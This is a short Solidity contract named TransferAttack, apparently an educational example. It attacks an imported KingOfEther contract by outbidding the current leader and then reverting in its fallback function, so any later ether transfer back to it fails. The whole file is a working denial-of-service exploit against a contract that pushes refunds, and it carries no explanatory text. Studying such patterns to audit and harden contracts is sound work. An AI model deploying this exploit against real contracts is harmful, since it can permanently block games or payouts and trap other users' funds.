// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./KingOfEther.sol";

contract TransferAttack {
    KingOfEther public kingOfEther;

    constructor(address _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() external payable {
        uint256 mostSent = kingOfEther.mostSent();
        require(mostSent < msg.value, "Not enough ether to attack");

        kingOfEther.becomeRichest{value: msg.value}();
    }

    fallback() external {
        revert();
    }
}
